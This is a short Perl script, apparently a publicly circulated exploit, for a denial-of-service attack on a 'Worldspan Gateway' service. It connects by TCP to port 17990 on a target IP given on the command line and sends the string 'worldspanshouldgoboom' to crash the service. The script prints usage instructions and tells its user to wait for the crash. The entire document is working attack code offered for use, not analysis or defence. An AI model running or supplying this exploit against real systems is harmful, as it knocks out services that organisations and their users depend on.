#!/usr/bin/perl
#altomo@digitalgangsters.net
#Worldspan Gateway DoS

$sabre = "worldspanshouldgoboom";

use IO::Socket;
$ip = "$ARGV[0]";
$port = "17990";
if ($#ARGV<0) {
print " useage: $0 <ip>\n";
exit();
}
$socket = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>$ip,
PeerPort=>$port,);


print "Worldspan Gateway DoS\n";
print "altomo\@digitalgangsters.net\n";

print "Wait about a minute, and it should crash.\n";
print $socket "$sabre\r";
close $socket;
